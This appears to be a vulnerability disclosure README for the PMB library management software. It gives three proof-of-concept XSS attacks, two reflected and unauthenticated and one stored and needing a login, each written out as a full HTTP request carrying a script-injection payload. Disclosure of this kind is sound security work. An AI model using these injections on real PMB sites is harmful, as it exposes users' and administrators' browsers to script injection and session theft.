## PMB  7.3.10 - CVE-XXX 

* Description : Allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser
* Affected version :  7.3.10 >=

### Information

To make this PoC, I just installed the software (`https://forge.sigb.net/projects/pmb/files`)

* Vulnerability Type : XSS Reflected ( Unauthentificated )

### POC 

There is an exemple with alert: 

```
GET /index.php?lvl=author_see&id=42691%27%7cecho%20%3E%3C/a%3E%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3Ed5u3g%20ijwh7gefly%20%23xzwx HTTP/1.1
Host: xxxxx.fr
Cookie: PhpMyBibli-OPACDB=pmb_test; _ga=GA1.2.80710046205; __utmz=147501360.tmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=147501632.2; PhpMyBibli-COOKIECONSENT=!pmbstatopac=true
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

### Preview 

<img width="1280" alt="poc-xss" src="https://raw.githubusercontent.com/jenaye/PMB/main/poc.png">



----------


## PMB 7.4.1 - CVE-XXX 

* Description : Allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser by body parameter from POST request
* Affected version : 7.4.1 (lasted)

### Information

To make this PoC, I just installed the software (`https://forge.sigb.net/projects/pmb/files`)

* Vulnerability Type : XSS Reflected ( Unauthentificated )

### POC 

There is an exemple with alert: 

```
POST /pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search HTTP/1.1
Host: localhost
Content-Length: 165
Cache-Control: max-age=0
sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/pmb/opac_css/index.php?lvl=index&search_type_asked=extended_search
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PhpMyBibli-OPACDB=bibli; PmbOpac-SESSNAME=PmbOpac; PmbOpac-SESSID=2044540279; PhpMyBibli-OPACDB=bibli; PhpMyBibli-DATABASE=bibli; rwtxt-domains=",68qr7xelmc"; PHPSESSID=gqhnot1fc67bn5he0bflumrbh7; pmb3619056675=gr56m1hb6qesp47kqnsfpf8qn6
Connection: close

add_field=&search%5B%5D=f_1&op_0_f_1=EXACT&field_0_f_1%5B%5D=gang&explicit_search=1&search_xml_file=search_fields&delete_field=&launch_search=1&page=&no_search=0&ij6fm%22%3e%3cscript%3ealert(1)%3c%2fscript%3evg9q6c4g1mk=1
```



----------


## PMB 7.4.1 - CVE-XXX 

* Description : Allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser by body parameter from POST request
* Affected version : 7.4.1 (lasted)

### Information

To make this PoC, I just installed the software (`https://forge.sigb.net/projects/pmb/files`)

* Vulnerability Type : XSS Stored ( Authentificated )

### POC 

There is an exemple with alert: 

```
POST /pmb/admin.php?categ=cms_editorial&sub=type&elem=article&action=save&id=3 HTTP/1.1
Host: localhost
Content-Length: 229
Cache-Control: max-age=0
sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/pmb/admin.php?categ=cms_editorial&sub=type&elem=article&action=edit&id=3
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PhpMyBibli-OPACDB=bibli; PhpMyBibli-DATABASE=bibli; PhpMyBibli-LOGIN=admin; PhpMyBibli-SESSNAME=PhpMyBibli; PhpMyBibli-SESSID=4768651558; filesTreeSaveStateCookie=0.506966344966034%2C0.506966344966034%2F0.20485223066281089%2C0.506966344966034%2F0.21127644710407156%2F0.07588620749494357%2F0.5386964886336061%2C0.506966344966034%2F0.21127644710407156%2F0.07588620749494357%2F0.5386964886336061%2F0.5524361244924687%2C0.506966344966034%2F0.21127644710407156%2F0.07588620749494357%2F0.5386964886336061%2F0.5524361244924687%2F0.5604307111281486%2C0.506966344966034%2F0.21127644710407156%2F0.07588620749494357%2F0.5386964886336061%2F0.5524361244924687%2F0.5604307111281486%2F0.9885325597889434%2C0.506966344966034%2F0.21127644710407156%2F0.29958385610940796%2C0.506966344966034%2F0.20485223066281089%2F0.13827414385022663%2C0.506966344966034%2F0.20485223066281089%2F0.13827414385022663%2F0.5519183400871519%2C0.506966344966034%2F0.20485223066281089%2F0.13827414385022663%2F0.14825971714188912%2C0.506966344966034%2F0.20485223066281089%2F0.5972892199220485; rwtxt-domains=",68qr7xelmc"; PHPSESSID=gqhnot1fc67bn5he0bflumrbh7; pmb3619056675=gr56m1hb6qesp47kqnsfpf8qn6; pmb4768651558=oj4vh2ag1b0eonnsirg5rmvn09
Connection: close

cms_editorial_type_label=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&cms_editorial_type_comment=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&cms_editorial_type_page_selector=0&cms_editorial_type_page_var_selector=0&save_button=Enregistrer
```

### Preview 

<img width="1280" alt="poc-xss" src="https://raw.githubusercontent.com/jenaye/PMB/main/poc3.png">
<img width="1280" alt="poc-xss" src="https://raw.githubusercontent.com/jenaye/PMB/main/poc3-alert.png">
